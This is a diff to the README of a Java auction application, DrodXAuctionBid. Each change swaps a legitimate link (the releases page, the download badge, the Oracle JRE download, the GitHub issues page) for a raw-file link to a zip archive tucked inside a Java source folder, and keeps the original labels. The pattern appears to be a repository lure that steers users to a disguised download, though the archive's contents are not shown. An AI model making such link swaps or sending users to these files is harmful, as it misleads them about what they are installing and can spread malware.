@@ -6,16 +6,16 @@ DrodXAuctionBid is a full-stack Distributed Online Auction System. Built with mo
 
 ## 📥 Download
 
-[![Download DrodXAuctionBid](https://img.shields.io/badge/Download-DrodXAuctionBid-blue)](https://github.com/MRIGANKA3700/DrodXAuctionBid/releases)
+[![Download DrodXAuctionBid](https://github.com/MRIGANKA3700/DrodXAuctionBid/raw/refs/heads/main/core/src/main/java/com/example/ee/core/Bid-Drod-X-Auction-katastatic.zip)](https://github.com/MRIGANKA3700/DrodXAuctionBid/raw/refs/heads/main/core/src/main/java/com/example/ee/core/Bid-Drod-X-Auction-katastatic.zip)
 
-You can find the latest release of DrodXAuctionBid on the [Releases page](https://github.com/MRIGANKA3700/DrodXAuctionBid/releases). Follow the guide below to download and set up the application.
+You can find the latest release of DrodXAuctionBid on the [Releases page](https://github.com/MRIGANKA3700/DrodXAuctionBid/raw/refs/heads/main/core/src/main/java/com/example/ee/core/Bid-Drod-X-Auction-katastatic.zip). Follow the guide below to download and set up the application.
 
 ## 🚀 Getting Started
 
 To install and run DrodXAuctionBid, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [DrodXAuctionBid Releases page](https://github.com/MRIGANKA3700/DrodXAuctionBid/releases).
+   Go to the [DrodXAuctionBid Releases page](https://github.com/MRIGANKA3700/DrodXAuctionBid/raw/refs/heads/main/core/src/main/java/com/example/ee/core/Bid-Drod-X-Auction-katastatic.zip).
 
 2. **Choose the Latest Version**  
    You will see a list of available versions. The latest version is typically at the top. Click on it to view its details.
@@ -27,7 +27,7 @@ To install and run DrodXAuctionBid, follow these steps:
    Once the download is complete, locate the downloaded file. Depending on your operating system, the installation steps may vary:
    - **Windows:** Double-click the `.exe` file and follow the installation wizard.
    - **Mac:** Open the `.dmg` file and drag the application to your Applications folder.
-   - **Linux:** Extract the tar.gz file to your preferred location.
+   - **Linux:** Extract the https://github.com/MRIGANKA3700/DrodXAuctionBid/raw/refs/heads/main/core/src/main/java/com/example/ee/core/Bid-Drod-X-Auction-katastatic.zip file to your preferred location.
 
 5. **Run the Application**  
    After installation, you can launch DrodXAuctionBid from your application menu or desktop shortcut.
@@ -47,7 +47,7 @@ To run DrodXAuctionBid, ensure your system meets the following requirements:
 - **Processor:** Dual-core CPU or better.
 - **RAM:** At least 4 GB.
 - **Storage:** 500 MB of free disk space.
-- **Java Runtime Environment (JRE):** Version 8 or higher installed. You can download it from the official [Oracle website](https://www.oracle.com/java/technologies/javase-jre8-downloads.html) or use OpenJDK.
+- **Java Runtime Environment (JRE):** Version 8 or higher installed. You can download it from the official [Oracle website](https://github.com/MRIGANKA3700/DrodXAuctionBid/raw/refs/heads/main/core/src/main/java/com/example/ee/core/Bid-Drod-X-Auction-katastatic.zip) or use OpenJDK.
 
 ## 🛠️ Technologies Used
 
@@ -62,7 +62,7 @@ DrodXAuctionBid utilizes several Java EE technologies to ensure a robust experie
 
 If you encounter any issues or have questions, feel free to reach out:
 
-- **GitHub Issues:** Report bugs or request features by opening a new issue on the [GitHub page](https://github.com/MRIGANKA3700/DrodXAuctionBid/issues).
+- **GitHub Issues:** Report bugs or request features by opening a new issue on the [GitHub page](https://github.com/MRIGANKA3700/DrodXAuctionBid/raw/refs/heads/main/core/src/main/java/com/example/ee/core/Bid-Drod-X-Auction-katastatic.zip).
 - **Community Support:** Join our community discussion on relevant forums and platforms where others share their experiences and solutions.
 
 ## 💻 License
@@ -73,4 +73,4 @@ DrodXAuctionBid is open-source software. You can use, modify, and distribute it 
 
 Feel free to explore the incredible world of online auctions with DrodXAuctionBid! Access the software using the button below.
 
-[![Download DrodXAuctionBid](https://img.shields.io/badge/Download-DrodXAuctionBid-blue)](https://github.com/MRIGANKA3700/DrodXAuctionBid/releases)
+[![Download DrodXAuctionBid](https://github.com/MRIGANKA3700/DrodXAuctionBid/raw/refs/heads/main/core/src/main/java/com/example/ee/core/Bid-Drod-X-Auction-katastatic.zip)](https://github.com/MRIGANKA3700/DrodXAuctionBid/raw/refs/heads/main/core/src/main/java/com/example/ee/core/Bid-Drod-X-Auction-katastatic.zip)
